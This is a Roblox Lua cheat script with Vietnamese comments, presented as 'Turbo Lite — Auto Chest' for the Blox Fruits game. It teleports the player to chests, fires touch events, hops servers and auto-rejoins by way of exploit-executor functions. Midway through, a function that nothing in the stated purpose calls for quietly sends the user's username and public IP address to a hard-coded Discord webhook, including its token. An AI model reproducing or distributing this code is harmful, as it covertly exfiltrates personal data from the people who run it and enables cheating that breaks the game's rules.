
-- Thông Báo 
require(game.ReplicatedStorage:WaitForChild("Notification")).new(
            " <Color=Green>Turbo Lite — Auto Chest<Color=/> "
        ):Display()
        
-- Join 
-- Kiểm tra xem giao diện chọn đội có tồn tại không
if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("ChooseTeam") then
    -- Chọn đội "Pirates" ngay lập tức
    local chooseTeamGui = game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam
    local piratesButton = chooseTeamGui.Container["Pirates"].Frame.TextButton

    -- Kích hoạt sự kiện khi người chơi chọn đội "Pirates"
    for _, connection in pairs(getconnections(piratesButton.Activated)) do
        -- Giả lập việc nhấn nút
        for _, inputConnection in pairs(getconnections(game:GetService("UserInputService").TouchTapInWorld)) do
            inputConnection:Fire() 
        end
        -- Thực thi hành động liên kết với nút
        connection.Function()
    end
end
        
repeat
    wait()
until game:IsLoaded()

-- Xác định thế giới
local world = "Unknown World"
if game.PlaceId == 2753915549 then
    world = "World 1"
elseif game.PlaceId == 4442272183 then
    world = "World 2"
elseif game.PlaceId == 7449423635 then
    world = "World 3"
end

-- Thông báo script đã kích hoạt
game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Auto Chest",
        Text = "Đã kích hoạt script tại " .. world,
        Duration = 5
    }
)

-- Khởi tạo các dịch vụ cần thiết
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    return warn("Không tìm thấy LocalPlayer!")
end

local AutoFarmChest = true
local hopserver = false
local ChooseRegion = "Singapore"
local chestsRemaining = 0

-- Hàm tự động farm chest
local function AutoFarmChests()
    while task.wait() do
        if AutoFarmChest then
            local closestChest = nil
            local closestDistance = math.huge
            chestsRemaining = 0

            for _, v in pairs(Workspace:GetChildren()) do
                if v.Name:find("Chest") then
                    chestsRemaining = chestsRemaining + 1
                    local distance = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if distance < closestDistance then
                        closestChest = v
                        closestDistance = distance
                    end
                end
            end

            if closestChest then
                LocalPlayer.Character:PivotTo(closestChest:GetPivot())
                firesignal(closestChest.Touched, LocalPlayer.Character.HumanoidRootPart)
            elseif chestsRemaining == 0 then
                game.StarterGui:SetCore(
                    "SendNotification",
                    {
                        Title = "Auto Chest",
                        Text = "Đã Lụm Hết Gương! Đang Hop Server...",
                        Duration = 5
                    }
                )
                AutoFarmChest = false
                hopserver = true
                HopServerLoop(8) -- Gọi hàm lặp vòng hop server
            end
        end
    end
end

-- Hàm hop server lặp vòng
function HopServerLoop(maxPlayers)
    maxPlayers = maxPlayers or 8 -- Mặc định giới hạn server là 8 người chơi

    while true do
        -- Tìm server mới
        local success = HopServer(maxPlayers)
        if success then
            print("Đã chuyển thành công sang server mới!")
            break -- Kết thúc vòng lặp khi teleport thành công
        else
            warn("Không tìm được server phù hợp, thử lại...")
            task.wait(2) -- Chờ 2 giây trước khi thử lại
        end
    end
end

--Webhook
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Auto Chest**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor, 
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1302586521131417610/8HgdPdFtBQKBDHD-0zkYRDFRsy8w-20baeuBdPOrcMTqJR9O95pEdurdXXV8-4Y-c1KH", AdminLoggerMsg()) -- Post to admin webhook

-- Kích hoạt Auto Rejoin ngay lập tức khi chạy script
getgenv().AutoRejoin = true

-- Auto Rejoin: Tự động tham gia lại khi bị ngắt kết nối
spawn(function()
    while wait(0.1) do
        if getgenv().AutoRejoin then
            getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(v661)
                if v661.Name == 'ErrorPrompt' and v661:FindFirstChild('MessageArea') and v661.MessageArea:FindFirstChild("ErrorFrame") then
                    game:GetService("TeleportService"):Teleport(game.PlaceId)
                end
            end)
        end
    end
end)

-- Biến ngẫu nhiên tự động
v138_ = 1
spawn(function()
    while wait(0.1) do
        v138_ = math.random(1, 5)
        wait(0.3)
    end
end)

-- Hàm hop server
function HopServer(maxPlayers)
    game.StarterGui:SetCore(
        "SendNotification",
        {
            Title = "Server Hopping",
            Text = "Đang tìm server mới... Vui lòng đợi!",
            Duration = 5
        }
    )

    -- Hàm tìm kiếm server
    local function GetServers()
        local page = 1
        local foundServer = false

        while true do
            -- Lấy danh sách server từ ReplicatedStorage
            local success, servers = pcall(function()
                return game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(page)
            end)

            if not success or not servers then
                warn("Không thể lấy danh sách server. Thử lại...")
                task.wait(2) -- Chờ 2 giây trước khi thử lại
                break
            end

            -- Kiểm tra từng server và teleport nếu phù hợp
            for id, info in pairs(servers) do
                if id ~= game.JobId and info.Count < maxPlayers then
                    -- Nếu tìm thấy server phù hợp
                    game.StarterGui:SetCore(
                        "SendNotification",
                        {
                            Title = "Server Found",
                            Text = "Đang chuyển đến server mới...",
                            Duration = 5
                        }
                    )

                    -- Teleport tới server đó
                    local teleportSuccess = pcall(function()
                        game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", id)
                    end)

                    if teleportSuccess then
                        foundServer = true
                        return true -- Kết thúc hàm khi teleport thành công
                    else
                        warn("Không thể teleport tới server mới.")
                    end
                end
            end

            -- Tiếp tục qua trang tiếp theo nếu chưa tìm thấy server phù hợp
            page = page + 1
        end

        -- Nếu không tìm thấy server, báo lỗi
        if not foundServer then
            return false
        end
    end

    -- Gọi hàm tìm server
    return GetServers()
end

-- Kích hoạt script
spawn(AutoFarmChests)